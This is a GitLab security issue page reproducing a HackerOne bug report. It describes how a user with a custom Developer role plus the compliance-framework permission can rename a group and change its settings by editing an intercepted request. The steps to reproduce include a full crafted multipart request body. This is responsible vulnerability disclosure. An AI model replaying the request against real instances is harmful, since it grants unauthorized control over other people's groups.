

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# User with custom role `Developer` base role `admin\_compliance\_framework` permission can change group URL via POST /{group\_url}

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2513934](https://hackerone.com/reports/2513934)** by `js_noob` on 2024-05-21, assigned to [@greg](/greg "Greg Myers"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello team, from the [docs](https://docs.gitlab.com/ee/user/custom_roles/abilities.html#compliance-management), users with `admin_compliance_framework` should only be able to create/update/delete the group's compliance framework.

> Create, read, update, and delete compliance frameworks. Users with this permission can also assign a compliance framework label to a project, and set the default framework of a group.

However, users with that permission can update most of the group's permission, more specifically any change that is done by a POST request to `/GROUP_PATH`. The below POC is just an example of these changes.

##### Steps to reproduce

**As an owner:**

1. Create a new group and apply the ultimate trial to it
2. Create a new project in that group, and add a `.gitlab-ci.yml` file with the following content

```
job:
    script:
        - echo "Hello"
```

3. Navigate to <https://gitlab.com/groups/GROUP/-/settings/roles_and_permissions>, and create a new custom role having:
   1. base role: `Developer`
   2. extra role: `Admin compliance framework`

[![Screenshot_2024-05-21_at_4.37.52_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/63e6166fc8fd6786d5bf50725443922c62bd7d74/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33366262353166642d376366302d346533392d383339362d3033396638366666633032342f53637265656e73686f745f323032342d30352d32315f61745f342e33372e35325f504d2e706e67)

4. Invite a developer to that group, and grant him that new role

**As the developer:**

5. Verify that can't edit any of the group's settings
6. Navigate to <https://gitlab.com/groups/GROUP/-/security/compliance_dashboard/frameworks/new>, fill out the necessary fields, and intercept the request
7. Replace the request's URL with `/GROUP_PATH`
8. Replace the request body + headers (except cookies) with the following, noting:
   1. Replace `CSRF_TOKEN` with `X-Csrf-Token` header of the previous (original) header
   2. Replace `NEW_GROUP_PATH` with the path you want

```
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------663860612978856746113686263
Content-Length: 630
Origin: https://gitlab.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

-----------------------------663860612978856746113686263
Content-Disposition: form-data; name="_method"

patch
-----------------------------663860612978856746113686263
Content-Disposition: form-data; name="authenticity_token"

CSRF_TOKEN
-----------------------------663860612978856746113686263
Content-Disposition: form-data; name="group[parent_id]"

-----------------------------663860612978856746113686263
Content-Disposition: form-data; name="group[path]"

NEW_GROUP_PATH
-----------------------------663860612978856746113686263--
```

9. Verify the success

**Please refer to the video attached is you get stuck at any point.**

##### Examples

[Screen\_Recording\_2024-05-21\_at\_4.28.35\_PM.mov](https://user-content.gitlab-static.net/0e1a7e9024992dee2f7c5d44de35daabe31ae7b9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63663635386539332d626235362d346233362d616536662d6533646334633132323464632f53637265656e5f5265636f7264696e675f323032342d30352d32315f61745f342e32382e33355f504d2e6d6f76 "Download 'Screen_Recording_2024-05-21_at_4.28.35_PM.mov'")

##### What is the current *bug* behavior?

Users with `admin_compliance_framework` custom permission have access to `POST /GROUP_PATH`.

##### What is the expected *correct* behavior?

Users with `admin_compliance_framework` custom permission shouldn't be able access to `POST /GROUP_PATH`.

##### Output of checks

This bug happens on GitLab.com

#### Impact

Unauthorized users can change a group's settings.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Recording\_2024-05-21\_at\_4.28.35\_PM.mov](https://h1.sec.gitlab.net/a/cf658e93-bb56-4b36-ae6f-e3dc4c1224dc/Screen_Recording_2024-05-21_at_4.28.35_PM.mov)
* [Screenshot\_2024-05-21\_at\_4.37.52\_PM.png](https://h1.sec.gitlab.net/a/36bb51fd-7cf0-4e39-8396-039f86ffc024/Screenshot_2024-05-21_at_4.37.52_PM.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

